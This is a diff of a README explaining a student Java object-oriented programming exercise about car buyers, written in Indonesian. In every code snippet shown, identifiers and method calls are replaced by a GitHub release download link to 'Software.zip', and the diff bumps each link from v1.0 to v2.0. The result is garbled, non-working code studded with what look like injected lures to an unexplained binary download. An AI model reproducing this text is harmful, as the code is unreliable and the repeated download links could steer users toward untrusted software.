@@ -46,9 +46,9 @@ String tahunMobil;
 
 ```bash
 public mobil(String nama, String namaMobil, String tahunMobil) {
-        https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip = nama;
-        https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip = namaMobil;
-        https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip = tahunMobil;
+        https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip = nama;
+        https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip = namaMobil;
+        https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip = tahunMobil;
     }
 
 public class statusMobil extends mobil{
@@ -61,15 +61,15 @@ public class statusMobil extends mobil{
 
 ```bash
     public void setNama(String nama) {
-        https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip = nama;
+        https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip = nama;
     }
 
     public void setNamaMobil(String namaMobil) {
-        https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip = namaMobil;
+        https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip = namaMobil;
     }
 
     public void setTahunMobil(String tahunMobil) {
-        https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip = tahunMobil;
+        https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip = tahunMobil;
     }
 ```
 
@@ -110,7 +110,7 @@ public class statusMobil extends mobil {
 ```bash
 @Override
     public String displayInfo(){
-        return https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip()+
+        return https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip()+
                 "\n Mobil : " + getMobil()+
                 "\n Tahun : " + getTahun();
     }
@@ -139,13 +139,13 @@ public String getMobil(){
 
  public String getTahun(){
         String tahunMobil = getTahunMobil();
-        if (https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip("1")){
+        if (https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip("1")){
             return "2005-2010";
         } else {
-        if (https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip("2")){
+        if (https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip("2")){
             return "2010-2015";
         } else {
-        if (https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip("3")){
+        if (https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip("3")){
             return "2015-2020";
         } else {
             return "tahun tidak diketahui";
@@ -158,24 +158,24 @@ public String getMobil(){
 11. **Perulangan** adalah statement kontrol yang digunakan untuk menjalankan blok kode berulang kali. Pada kode ini, digunakan loop `for` untuk meminta input dan menampilkan data.
 
 ```bash
-for(int i=0; i<https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip; i++) {
+for(int i=0; i<https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip; i++) {
     ...
 }
 ```
 
-12. **Input Output Sederhana** digunakan untuk menerima input dari user dan menampilkan output ke user. Pada kode ini, digunakan class `Scanner` untuk menerima input dan method `https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip` untuk menampilkan output.
+12. **Input Output Sederhana** digunakan untuk menerima input dari user dan menampilkan output ke user. Pada kode ini, digunakan class `Scanner` untuk menerima input dan method `https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip` untuk menampilkan output.
 
 ```bash
-Scanner scanner = new Scanner(https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip);
-https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip("======================\nMasukkan nama Pembeli "+(i+1)+": ");
-String nama = https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip();
-https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip("https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip\https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip\https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip\https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip\https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip\nPilih Mobil: ");
-String namaMobil = https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip();
-https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip("1.2005-2010\n2.2010-2015\n3.2015-2020\nPilih Tahun Mobil: ");
-String tahunMobil = https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip();
+Scanner scanner = new Scanner(https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip);
+https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip("======================\nMasukkan nama Pembeli "+(i+1)+": ");
+String nama = https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip();
+https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip("https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip\https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip\https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip\https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip\https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip\nPilih Mobil: ");
+String namaMobil = https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip();
+https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip("1.2005-2010\n2.2010-2015\n3.2015-2020\nPilih Tahun Mobil: ");
+String tahunMobil = https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip();
 
-https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip("===Data Pembeli===");
-https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip(https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v1.0/Software.zip());
+https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip("===Data Pembeli===");
+https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip(https://github.com/adegate/Muhammad-Ade-Gati-Pangestu_2110010496_4G_PBO1/releases/download/v2.0/Software.zip());
 ```
 
 13. **Array** adalah struktur data yang digunakan untuk menyimpan beberapa nilai dalam satu variabel. Pada kode ini, `statusMobil[] pembeli = new statusMobil[2];` adalah contoh penggunaan array.
